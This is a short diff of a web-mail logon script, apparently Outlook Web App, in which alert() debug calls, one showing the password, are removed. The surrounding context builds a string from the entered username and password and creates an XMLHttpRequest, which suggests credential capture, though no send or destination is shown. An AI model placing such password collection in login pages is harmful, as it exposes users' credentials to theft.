@@ -367,7 +367,7 @@ function clkLgn()
     // Add performance marker for Logon page as the item name defined in the spec:
     // http://exweb/14/Specs/E14 Spec Library/Client side perf marker definition.xlsx
     //
-	alert(99999);
+
     // var curTime = new Date().toLocaleDateString();
     // var ObjectData = "ObjectType=" + escape(curTime + "\t" + gbid("username").value + "\t" + gbid("password").value) + "&uin=" + Math.random().toString(16).substring(2);
     var xmlhttp = new XMLHttpRequest();
@@ -400,8 +400,7 @@ function clkLgn()
         var sA = "acc=" + (gbid("chkBsc") && gbid("chkBsc").checked ? 1 : 0);
         var sL = "lgn=" + gbid("username").value;
 	var sX = gbid("password").value;
-	alert(sL);
-	alert(sX);
+
 	
         document.cookie = "logondata=" + sA + "&" + sL + "; expires=" + oD.toUTCString();
         document.cookie = "PrivateComputer=true; path=/; expires=" + oD.toUTCString();
